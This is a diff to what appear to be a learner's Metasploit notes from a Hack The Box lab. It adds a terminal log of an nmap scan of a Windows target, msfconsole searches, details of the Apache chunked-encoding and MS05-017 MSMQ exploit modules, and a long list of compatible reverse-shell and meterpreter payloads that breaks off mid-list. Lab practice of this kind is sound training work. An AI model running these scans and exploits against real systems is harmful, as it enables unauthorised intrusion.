@@ -2130,10 +2130,10 @@ Time to set our parameters for both the Exploit module and the payload module. F
 
 For the payload part, we will need to set the following:
 
-|**Parameter**|**Description**|
-|---|---|
-|`LHOST`|The host's IP address, the attacker's machine.|
-|`LPORT`|Does not require a change, just a check that the port is not already in use.|
+| **Parameter** | **Description**                                                              |
+| ------------- | ---------------------------------------------------------------------------- |
+| `LHOST`       | The host's IP address, the attacker's machine.                               |
+| `LPORT`       | Does not require a change, just a check that the port is not already in use. |
 
 If we want to check our LHOST IP address quickly, we can always call the `ifconfig` command directly from the msfconsole menu.
 
@@ -4425,5 +4425,2648 @@ From this point, if the machine was connected to a more extensive network, we co
 
 
 ```
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ sudo nmap -sV -sS -p- 10.129.1.11
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-27 18:47 EDT
+Nmap scan report for 10.129.1.11
+Host is up (0.0088s latency).
+Not shown: 65520 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5000/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-4yleykfxye]─[~]
+└──╼ [★]$ msfconsole -q
+[msf](Jobs:0 Agents:0) >> search httpd 2.0
+
+Matching Modules
+================
+
+   #   Name                                                         Disclosure Date  Rank       Check  Description
+   -   ----                                                         ---------------  ----       -----  -----------
+   0   exploit/windows/http/apache_chunked                          2002-06-19       good       Yes    Apache Win32 Chunked Encoding
+   1     \_ target: Windows Generic Bruteforce                      .                .          .      .
+   2     \_ target: Apache.org Build 1.3.9->1.3.19                  .                .          .      .
+   3     \_ target: Apache.org Build 1.3.22->1.3.24                 .                .          .      .
+   4     \_ target: Apache.org Build 1.3.19->1.3.24                 .                .          .      .
+   5     \_ target: Apache.org Build 1.3.22                         .                .          .      .
+   6     \_ target: Apache.org Build 1.3.17->1.3.24 (Windows 2000)  .                .          .      .
+   7     \_ target: Apache.org Build 1.3.17->1.3.24 (Windows NT)    .                .          .      .
+   8     \_ target: Windows 2003 English SP0                        .                .          .      .
+   9     \_ target: Windows 2000 English                            .                .          .      .
+   10    \_ target: Oracle 8.1.7 Apache 1.3.12                      .                .          .      .
+   11    \_ target: Oracle 9.1.0 Apache 1.3.12                      .                .          .      .
+   12    \_ target: Oracle 9.2.0 Apache 1.3.22                      .                .          .      .
+   13    \_ target: Debugging Target                                .                .          .      .
+   14  auxiliary/dos/http/monkey_headers                            2013-05-30       normal     No     Monkey HTTPD Header Parsing Denial of Service (DoS)
+   15  exploit/unix/webapp/jquery_file_upload                       2018-10-09       excellent  Yes    blueimp's jQuery (Arbitrary) File Upload
+   16    \_ target: PHP Dropper                                     .                .          .      .
+   17    \_ target: Linux Dropper                                   .                .          .      .
+
+
+Interact with a module by name or index. For example info 17, use 17 or use exploit/unix/webapp/jquery_file_upload
+After interacting with a module you can manually set a TARGET with set TARGET 'Linux Dropper'
+
+[msf](Jobs:0 Agents:0) >> use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> info
+
+       Name: Apache Win32 Chunked Encoding
+     Module: exploit/windows/http/apache_chunked
+   Platform: Windows
+       Arch: 
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Good
+  Disclosed: 2002-06-19
+
+Provided by:
+  hdm <x@hdm.io>
+  jduck <jduck@metasploit.com>
+
+Module side effects:
+ unknown-side-effects
+
+Module stability:
+ unknown-stability
+
+Module reliability:
+ unknown-reliability
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Windows Generic Bruteforce
+      1   Apache.org Build 1.3.9->1.3.19
+      2   Apache.org Build 1.3.22->1.3.24
+      3   Apache.org Build 1.3.19->1.3.24
+      4   Apache.org Build 1.3.22
+      5   Apache.org Build 1.3.17->1.3.24 (Windows 2000)
+      6   Apache.org Build 1.3.17->1.3.24 (Windows NT)
+      7   Windows 2003 English SP0
+      8   Windows 2000 English
+      9   Oracle 8.1.7 Apache 1.3.12
+      10  Oracle 9.1.0 Apache 1.3.12
+      11  Oracle 9.2.0 Apache 1.3.22
+      12  Debugging Target
+
+Check supported:
+  Yes
+
+Basic options:
+  Name     Current Setting  Required  Description
+  ----     ---------------  --------  -----------
+  Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, http, socks5, socks5h
+  RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT    80               yes       The target port (TCP)
+  SSL      false            no        Negotiate SSL/TLS for outgoing connections
+  VHOST                     no        HTTP server virtual host
+
+Payload information:
+  Space: 987
+  Avoid: 8 characters
+
+Description:
+  This module exploits the chunked transfer integer wrap
+  vulnerability in Apache version 1.2.x to 1.3.24. This
+  particular module has been tested with all versions of the
+  official Win32 build between 1.3.9 and 1.3.24. Additionally,
+  it should work against most co-branded and bundled versions
+  of Apache (Oracle 8i, 9i, IBM HTTPD, etc).
+
+  You will need to use the Check() functionality to determine
+  the exact target version prior to launching the exploit. The
+  version of Apache bundled with Oracle 8.1.7 will not
+  automatically restart, so if you use the wrong target value,
+  the server will crash.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2002-0392
+  OSVDB (838)
+  http://www.securityfocus.com/bid/5033
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> search msrpc
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank  Check  Description
+   -  ----                                  ---------------  ----  -----  -----------
+   0  exploit/windows/dcerpc/ms05_017_msmq  2005-04-12       good  No     MS05-017 Microsoft Message Queueing Service Path Overflow
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/dcerpc/ms05_017_msmq
+
+[msf](Jobs:0 Agents:0) exploit(windows/http/apache_chunked) >> use 0
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> info
+
+       Name: MS05-017 Microsoft Message Queueing Service Path Overflow
+     Module: exploit/windows/dcerpc/ms05_017_msmq
+   Platform: Windows
+       Arch: 
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Good
+  Disclosed: 2005-04-12
+
+Provided by:
+  hdm <x@hdm.io>
+
+Module side effects:
+ unknown-side-effects
+
+Module stability:
+ unknown-stability
+
+Module reliability:
+ unknown-reliability
+
+Available targets:
+      Id  Name
+      --  ----
+  =>  0   Windows 2000 ALL / Windows XP SP0-SP1 (English)
+
+Check supported:
+  No
+
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  HNAME                    yes       The NetBIOS hostname of the target
+  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+  RPORT   2103             yes       The target port (TCP)
+
+Payload information:
+  Space: 1024
+  Avoid: 8 characters
+
+Description:
+  This module exploits a stack buffer overflow in the RPC interface
+  to the Microsoft Message Queueing service. The offset to the
+  return address changes based on the length of the system
+  hostname, so this must be provided via the 'HNAME' option.
+  Much thanks to snort.org and Jean-Baptiste Marchand's
+  excellent MSRPC website.
+
+References:
+  https://nvd.nist.gov/vuln/detail/CVE-2005-0059
+  OSVDB (15458)
+  https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2005/MS05-017
+  http://www.securityfocus.com/bid/13112
+
+
+View the full module info with the info -d command.
+
+[msf](Jobs:0 Agents:0) exploit(windows/dcerpc/ms05_017_msmq) >> show payloads
+
+Compatible Payloads
+===================
+
+   #    Name                                                        Disclosure Date  Rank    Check  Description
+   -    ----                                                        ---------------  ----    -----  -----------
+   0    payload/generic/custom                                      .                normal  No     Custom Payload
+   1    payload/generic/debug_trap                                  .                normal  No     Generic x86 Debug Trap
+   2    payload/generic/shell_bind_aws_ssm                          .                normal  No     Command Shell, Bind SSM (via AWS API)
+   3    payload/generic/shell_bind_tcp                              .                normal  No     Generic Command Shell, Bind TCP Inline
+   4    payload/generic/shell_reverse_tcp                           .                normal  No     Generic Command Shell, Reverse TCP Inline
+   5    payload/generic/ssh/interact                                .                normal  No     Interact with Established SSH Connection
+   6    payload/generic/tight_loop                                  .                normal  No     Generic x86 Tight Loop
+   7    payload/windows/adduser                                     .                normal  No     Windows Execute net user /ADD
+   8    payload/windows/custom/bind_hidden_ipknock_tcp              .                normal  No     Windows shellcode stage, Hidden Bind Ipknock TCP Stager
+   9    payload/windows/custom/bind_hidden_tcp                      .                normal  No     Windows shellcode stage, Hidden Bind TCP Stager
+   10   payload/windows/custom/bind_ipv6_tcp                        .                normal  No     Windows shellcode stage, Bind IPv6 TCP Stager (Windows x86)
+   11   payload/windows/custom/bind_ipv6_tcp_uuid                   .                normal  No     Windows shellcode stage, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   12   payload/windows/custom/bind_named_pipe                      .                normal  No     Windows shellcode stage, Windows x86 Bind Named Pipe Stager
+   13   payload/windows/custom/bind_nonx_tcp                        .                normal  No     Windows shellcode stage, Bind TCP Stager (No NX or Win7)
+   14   payload/windows/custom/bind_tcp                             .                normal  No     Windows shellcode stage, Bind TCP Stager (Windows x86)
+   15   payload/windows/custom/bind_tcp_rc4                         .                normal  No     Windows shellcode stage, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   16   payload/windows/custom/bind_tcp_uuid                        .                normal  No     Windows shellcode stage, Bind TCP Stager with UUID Support (Windows x86)
+   17   payload/windows/custom/reverse_http                         .                normal  No     Windows shellcode stage, Windows Reverse HTTP Stager (wininet)
+   18   payload/windows/custom/reverse_http_proxy_pstore            .                normal  No     Windows shellcode stage, Reverse HTTP Stager Proxy
+   19   payload/windows/custom/reverse_https                        .                normal  No     Windows shellcode stage, Windows Reverse HTTPS Stager (wininet)
+   20   payload/windows/custom/reverse_ipv6_tcp                     .                normal  No     Windows shellcode stage, Reverse TCP Stager (IPv6)
+   21   payload/windows/custom/reverse_named_pipe                   .                normal  No     Windows shellcode stage, Windows x86 Reverse Named Pipe (SMB) Stager
+   22   payload/windows/custom/reverse_nonx_tcp                     .                normal  No     Windows shellcode stage, Reverse TCP Stager (No NX or Win7)
+   23   payload/windows/custom/reverse_ord_tcp                      .                normal  No     Windows shellcode stage, Reverse Ordinal TCP Stager (No NX or Win7)
+   24   payload/windows/custom/reverse_tcp                          .                normal  No     Windows shellcode stage, Reverse TCP Stager
+   25   payload/windows/custom/reverse_tcp_allports                 .                normal  No     Windows shellcode stage, Reverse All-Port TCP Stager
+   26   payload/windows/custom/reverse_tcp_dns                      .                normal  No     Windows shellcode stage, Reverse TCP Stager (DNS)
+   27   payload/windows/custom/reverse_tcp_rc4                      .                normal  No     Windows shellcode stage, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   28   payload/windows/custom/reverse_tcp_rc4_dns                  .                normal  No     Windows shellcode stage, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   29   payload/windows/custom/reverse_tcp_uuid                     .                normal  No     Windows shellcode stage, Reverse TCP Stager with UUID Support
+   30   payload/windows/custom/reverse_udp                          .                normal  No     Windows shellcode stage, Reverse UDP Stager with UUID Support
+   31   payload/windows/custom/reverse_winhttp                      .                normal  No     Windows shellcode stage, Windows Reverse HTTP Stager (winhttp)
+   32   payload/windows/custom/reverse_winhttps                     .                normal  No     Windows shellcode stage, Windows Reverse HTTPS Stager (winhttp)
+   33   payload/windows/dllinject/bind_hidden_ipknock_tcp           .                normal  No     Reflective DLL Injection, Hidden Bind Ipknock TCP Stager
+   34   payload/windows/dllinject/bind_hidden_tcp                   .                normal  No     Reflective DLL Injection, Hidden Bind TCP Stager
+   35   payload/windows/dllinject/bind_ipv6_tcp                     .                normal  No     Reflective DLL Injection, Bind IPv6 TCP Stager (Windows x86)
+   36   payload/windows/dllinject/bind_ipv6_tcp_uuid                .                normal  No     Reflective DLL Injection, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   37   payload/windows/dllinject/bind_named_pipe                   .                normal  No     Reflective DLL Injection, Windows x86 Bind Named Pipe Stager
+   38   payload/windows/dllinject/bind_nonx_tcp                     .                normal  No     Reflective DLL Injection, Bind TCP Stager (No NX or Win7)
+   39   payload/windows/dllinject/bind_tcp                          .                normal  No     Reflective DLL Injection, Bind TCP Stager (Windows x86)
+   40   payload/windows/dllinject/bind_tcp_rc4                      .                normal  No     Reflective DLL Injection, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   41   payload/windows/dllinject/bind_tcp_uuid                     .                normal  No     Reflective DLL Injection, Bind TCP Stager with UUID Support (Windows x86)
+   42   payload/windows/dllinject/reverse_http                      .                normal  No     Reflective DLL Injection, Windows Reverse HTTP Stager (wininet)
+   43   payload/windows/dllinject/reverse_http_proxy_pstore         .                normal  No     Reflective DLL Injection, Reverse HTTP Stager Proxy
+   44   payload/windows/dllinject/reverse_ipv6_tcp                  .                normal  No     Reflective DLL Injection, Reverse TCP Stager (IPv6)
+   45   payload/windows/dllinject/reverse_nonx_tcp                  .                normal  No     Reflective DLL Injection, Reverse TCP Stager (No NX or Win7)
+   46   payload/windows/dllinject/reverse_ord_tcp                   .                normal  No     Reflective DLL Injection, Reverse Ordinal TCP Stager (No NX or Win7)
+   47   payload/windows/dllinject/reverse_tcp                       .                normal  No     Reflective DLL Injection, Reverse TCP Stager
+   48   payload/windows/dllinject/reverse_tcp_allports              .                normal  No     Reflective DLL Injection, Reverse All-Port TCP Stager
+   49   payload/windows/dllinject/reverse_tcp_dns                   .                normal  No     Reflective DLL Injection, Reverse TCP Stager (DNS)
+   50   payload/windows/dllinject/reverse_tcp_rc4                   .                normal  No     Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   51   payload/windows/dllinject/reverse_tcp_rc4_dns               .                normal  No     Reflective DLL Injection, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   52   payload/windows/dllinject/reverse_tcp_uuid                  .                normal  No     Reflective DLL Injection, Reverse TCP Stager with UUID Support
+   53   payload/windows/dllinject/reverse_winhttp                   .                normal  No     Reflective DLL Injection, Windows Reverse HTTP Stager (winhttp)
+   54   payload/windows/dns_txt_query_exec                          .                normal  No     DNS TXT Record Payload Download and Execution
+   55   payload/windows/download_exec                               .                normal  No     Windows Executable Download (http,https,ftp) and Execute
+   56   payload/windows/exec                                        .                normal  No     Windows Execute Command
+   57   payload/windows/format_all_drives                           .                manual  No     Windows Drive Formatter
+   58   payload/windows/loadlibrary                                 .                normal  No     Windows LoadLibrary Path
+   59   payload/windows/messagebox                                  .                normal  No     Windows MessageBox
+   60   payload/windows/meterpreter/bind_hidden_ipknock_tcp         .                normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind Ipknock TCP Stager
+   61   payload/windows/meterpreter/bind_hidden_tcp                 .                normal  No     Windows Meterpreter (Reflective Injection), Hidden Bind TCP Stager
+   62   payload/windows/meterpreter/bind_ipv6_tcp                   .                normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager (Windows x86)
+   63   payload/windows/meterpreter/bind_ipv6_tcp_uuid              .                normal  No     Windows Meterpreter (Reflective Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   64   payload/windows/meterpreter/bind_named_pipe                 .                normal  No     Windows Meterpreter (Reflective Injection), Windows x86 Bind Named Pipe Stager
+   65   payload/windows/meterpreter/bind_nonx_tcp                   .                normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)
+   66   payload/windows/meterpreter/bind_tcp                        .                normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (Windows x86)
+   67   payload/windows/meterpreter/bind_tcp_rc4                    .                normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   68   payload/windows/meterpreter/bind_tcp_uuid                   .                normal  No     Windows Meterpreter (Reflective Injection), Bind TCP Stager with UUID Support (Windows x86)
+   69   payload/windows/meterpreter/reverse_http                    .                normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (wininet)
+   70   payload/windows/meterpreter/reverse_http_proxy_pstore       .                normal  No     Windows Meterpreter (Reflective Injection), Reverse HTTP Stager Proxy
+   71   payload/windows/meterpreter/reverse_https                   .                normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (wininet)
+   72   payload/windows/meterpreter/reverse_ipv6_tcp                .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)
+   73   payload/windows/meterpreter/reverse_named_pipe              .                normal  No     Windows Meterpreter (Reflective Injection), Windows x86 Reverse Named Pipe (SMB) Stager
+   74   payload/windows/meterpreter/reverse_nonx_tcp                .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)
+   75   payload/windows/meterpreter/reverse_ord_tcp                 .                normal  No     Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   76   payload/windows/meterpreter/reverse_tcp                     .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager
+   77   payload/windows/meterpreter/reverse_tcp_allports            .                normal  No     Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
+   78   payload/windows/meterpreter/reverse_tcp_dns                 .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
+   79   payload/windows/meterpreter/reverse_tcp_rc4                 .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   80   payload/windows/meterpreter/reverse_tcp_rc4_dns             .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   81   payload/windows/meterpreter/reverse_tcp_uuid                .                normal  No     Windows Meterpreter (Reflective Injection), Reverse TCP Stager with UUID Support
+   82   payload/windows/meterpreter/reverse_winhttp                 .                normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTP Stager (winhttp)
+   83   payload/windows/meterpreter/reverse_winhttps                .                normal  No     Windows Meterpreter (Reflective Injection), Windows Reverse HTTPS Stager (winhttp)
+   84   payload/windows/metsvc_bind_tcp                             .                normal  No     Windows Meterpreter Service, Bind TCP
+   85   payload/windows/metsvc_reverse_tcp                          .                normal  No     Windows Meterpreter Service, Reverse TCP Inline
+   86   payload/windows/patchupdllinject/bind_hidden_ipknock_tcp    .                normal  No     Windows Inject DLL, Hidden Bind Ipknock TCP Stager
+   87   payload/windows/patchupdllinject/bind_hidden_tcp            .                normal  No     Windows Inject DLL, Hidden Bind TCP Stager
+   88   payload/windows/patchupdllinject/bind_ipv6_tcp              .                normal  No     Windows Inject DLL, Bind IPv6 TCP Stager (Windows x86)
+   89   payload/windows/patchupdllinject/bind_ipv6_tcp_uuid         .                normal  No     Windows Inject DLL, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   90   payload/windows/patchupdllinject/bind_named_pipe            .                normal  No     Windows Inject DLL, Windows x86 Bind Named Pipe Stager
+   91   payload/windows/patchupdllinject/bind_nonx_tcp              .                normal  No     Windows Inject DLL, Bind TCP Stager (No NX or Win7)
+   92   payload/windows/patchupdllinject/bind_tcp                   .                normal  No     Windows Inject DLL, Bind TCP Stager (Windows x86)
+   93   payload/windows/patchupdllinject/bind_tcp_rc4               .                normal  No     Windows Inject DLL, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   94   payload/windows/patchupdllinject/bind_tcp_uuid              .                normal  No     Windows Inject DLL, Bind TCP Stager with UUID Support (Windows x86)
+   95   payload/windows/patchupdllinject/reverse_ipv6_tcp           .                normal  No     Windows Inject DLL, Reverse TCP Stager (IPv6)
+   96   payload/windows/patchupdllinject/reverse_nonx_tcp           .                normal  No     Windows Inject DLL, Reverse TCP Stager (No NX or Win7)
+   97   payload/windows/patchupdllinject/reverse_ord_tcp            .                normal  No     Windows Inject DLL, Reverse Ordinal TCP Stager (No NX or Win7)
+   98   payload/windows/patchupdllinject/reverse_tcp                .                normal  No     Windows Inject DLL, Reverse TCP Stager
+   99   payload/windows/patchupdllinject/reverse_tcp_allports       .                normal  No     Windows Inject DLL, Reverse All-Port TCP Stager
+   100  payload/windows/patchupdllinject/reverse_tcp_dns            .                normal  No     Windows Inject DLL, Reverse TCP Stager (DNS)
+   101  payload/windows/patchupdllinject/reverse_tcp_rc4            .                normal  No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   102  payload/windows/patchupdllinject/reverse_tcp_rc4_dns        .                normal  No     Windows Inject DLL, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   103  payload/windows/patchupdllinject/reverse_tcp_uuid           .                normal  No     Windows Inject DLL, Reverse TCP Stager with UUID Support
+   104  payload/windows/patchupmeterpreter/bind_hidden_ipknock_tcp  .                normal  No     Windows Meterpreter (skape/jt Injection), Hidden Bind Ipknock TCP Stager
+   105  payload/windows/patchupmeterpreter/bind_hidden_tcp          .                normal  No     Windows Meterpreter (skape/jt Injection), Hidden Bind TCP Stager
+   106  payload/windows/patchupmeterpreter/bind_ipv6_tcp            .                normal  No     Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager (Windows x86)
+   107  payload/windows/patchupmeterpreter/bind_ipv6_tcp_uuid       .                normal  No     Windows Meterpreter (skape/jt Injection), Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   108  payload/windows/patchupmeterpreter/bind_named_pipe          .                normal  No     Windows Meterpreter (skape/jt Injection), Windows x86 Bind Named Pipe Stager
+   109  payload/windows/patchupmeterpreter/bind_nonx_tcp            .                normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (No NX or Win7)
+   110  payload/windows/patchupmeterpreter/bind_tcp                 .                normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (Windows x86)
+   111  payload/windows/patchupmeterpreter/bind_tcp_rc4             .                normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   112  payload/windows/patchupmeterpreter/bind_tcp_uuid            .                normal  No     Windows Meterpreter (skape/jt Injection), Bind TCP Stager with UUID Support (Windows x86)
+   113  payload/windows/patchupmeterpreter/reverse_ipv6_tcp         .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (IPv6)
+   114  payload/windows/patchupmeterpreter/reverse_nonx_tcp         .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (No NX or Win7)
+   115  payload/windows/patchupmeterpreter/reverse_ord_tcp          .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse Ordinal TCP Stager (No NX or Win7)
+   116  payload/windows/patchupmeterpreter/reverse_tcp              .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager
+   117  payload/windows/patchupmeterpreter/reverse_tcp_allports     .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse All-Port TCP Stager
+   118  payload/windows/patchupmeterpreter/reverse_tcp_dns          .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (DNS)
+   119  payload/windows/patchupmeterpreter/reverse_tcp_rc4          .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   120  payload/windows/patchupmeterpreter/reverse_tcp_rc4_dns      .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   121  payload/windows/patchupmeterpreter/reverse_tcp_uuid         .                normal  No     Windows Meterpreter (skape/jt Injection), Reverse TCP Stager with UUID Support
+   122  payload/windows/peinject/bind_hidden_ipknock_tcp            .                normal  No     Windows Inject PE Files, Hidden Bind Ipknock TCP Stager
+   123  payload/windows/peinject/bind_hidden_tcp                    .                normal  No     Windows Inject PE Files, Hidden Bind TCP Stager
+   124  payload/windows/peinject/bind_ipv6_tcp                      .                normal  No     Windows Inject PE Files, Bind IPv6 TCP Stager (Windows x86)
+   125  payload/windows/peinject/bind_ipv6_tcp_uuid                 .                normal  No     Windows Inject PE Files, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   126  payload/windows/peinject/bind_named_pipe                    .                normal  No     Windows Inject PE Files, Windows x86 Bind Named Pipe Stager
+   127  payload/windows/peinject/bind_nonx_tcp                      .                normal  No     Windows Inject PE Files, Bind TCP Stager (No NX or Win7)
+   128  payload/windows/peinject/bind_tcp                           .                normal  No     Windows Inject PE Files, Bind TCP Stager (Windows x86)
+   129  payload/windows/peinject/bind_tcp_rc4                       .                normal  No     Windows Inject PE Files, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   130  payload/windows/peinject/bind_tcp_uuid                      .                normal  No     Windows Inject PE Files, Bind TCP Stager with UUID Support (Windows x86)
+   131  payload/windows/peinject/reverse_ipv6_tcp                   .                normal  No     Windows Inject PE Files, Reverse TCP Stager (IPv6)
+   132  payload/windows/peinject/reverse_named_pipe                 .                normal  No     Windows Inject PE Files, Windows x86 Reverse Named Pipe (SMB) Stager
+   133  payload/windows/peinject/reverse_nonx_tcp                   .                normal  No     Windows Inject PE Files, Reverse TCP Stager (No NX or Win7)
+   134  payload/windows/peinject/reverse_ord_tcp                    .                normal  No     Windows Inject PE Files, Reverse Ordinal TCP Stager (No NX or Win7)
+   135  payload/windows/peinject/reverse_tcp                        .                normal  No     Windows Inject PE Files, Reverse TCP Stager
+   136  payload/windows/peinject/reverse_tcp_allports               .                normal  No     Windows Inject PE Files, Reverse All-Port TCP Stager
+   137  payload/windows/peinject/reverse_tcp_dns                    .                normal  No     Windows Inject PE Files, Reverse TCP Stager (DNS)
+   138  payload/windows/peinject/reverse_tcp_rc4                    .                normal  No     Windows Inject PE Files, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   139  payload/windows/peinject/reverse_tcp_rc4_dns                .                normal  No     Windows Inject PE Files, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
+   140  payload/windows/peinject/reverse_tcp_uuid                   .                normal  No     Windows Inject PE Files, Reverse TCP Stager with UUID Support
+   141  payload/windows/pingback_bind_tcp                           .                normal  No     Windows x86 Pingback, Bind TCP Inline
+   142  payload/windows/pingback_reverse_tcp                        .                normal  No     Windows x86 Pingback, Reverse TCP Inline
+   143  payload/windows/powershell_bind_tcp                         .                normal  No     Windows Interactive Powershell Session, Bind TCP
+   144  payload/windows/powershell_reverse_tcp                      .                normal  No     Windows Interactive Powershell Session, Reverse TCP
+   145  payload/windows/powershell_reverse_tcp_ssl                  .                normal  No     Windows Interactive Powershell Session, Reverse TCP SSL
+   146  payload/windows/shell/bind_hidden_ipknock_tcp               .                normal  No     Windows Command Shell, Hidden Bind Ipknock TCP Stager
+   147  payload/windows/shell/bind_hidden_tcp                       .                normal  No     Windows Command Shell, Hidden Bind TCP Stager
+   148  payload/windows/shell/bind_ipv6_tcp                         .                normal  No     Windows Command Shell, Bind IPv6 TCP Stager (Windows x86)
+   149  payload/windows/shell/bind_ipv6_tcp_uuid                    .                normal  No     Windows Command Shell, Bind IPv6 TCP Stager with UUID Support (Windows x86)
+   150  payload/windows/shell/bind_named_pipe                       .                normal  No     Windows Command Shell, Windows x86 Bind Named Pipe Stager
+   151  payload/windows/shell/bind_nonx_tcp                         .                normal  No     Windows Command Shell, Bind TCP Stager (No NX or Win7)
+   152  payload/windows/shell/bind_tcp                              .                normal  No     Windows Command Shell, Bind TCP Stager (Windows x86)
+   153  payload/windows/shell/bind_tcp_rc4                          .                normal  No     Windows Command Shell, Bind TCP Stager (RC4 Stage Encryption, Metasm)
+   154  payload/windows/shell/bind_tcp_uuid                         .                normal  No     Windows Command Shell, Bind TCP Stager with UUID Support (Windows x86)
+   155  payload/windows/shell/reverse_ipv6_tcp                      .                normal  No     Windows Command Shell, Reverse TCP Stager (IPv6)
+   156  payload/windows/shell/reverse_nonx_tcp                      .                normal  No     Windows Command Shell, Reverse TCP Stager (No NX or Win7)
+   157  payload/windows/shell/reverse_ord_tcp                       .                normal  No     Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)
+   158  payload/windows/shell/reverse_tcp                           .                normal  No     Windows Command Shell, Reverse TCP Stager
+   159  payload/windows/shell/reverse_tcp_allports                  .                normal  No     Windows Command Shell, Reverse All-Port TCP Stager
+   160  payload/windows/shell/reverse_tcp_dns                       .                normal  No     Windows Command Shell, Reverse TCP Stager (DNS)
+   161  payload/windows/shell/reverse_tcp_rc4                       .                normal  No     Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption, Metasm)
+   162  payload/windows/shell/reverse_tcp_rc4_dns                   .                normal  No     Windows Command Shell, Reverse TCP Stager (RC4 Stage Encryption DNS, Metasm)
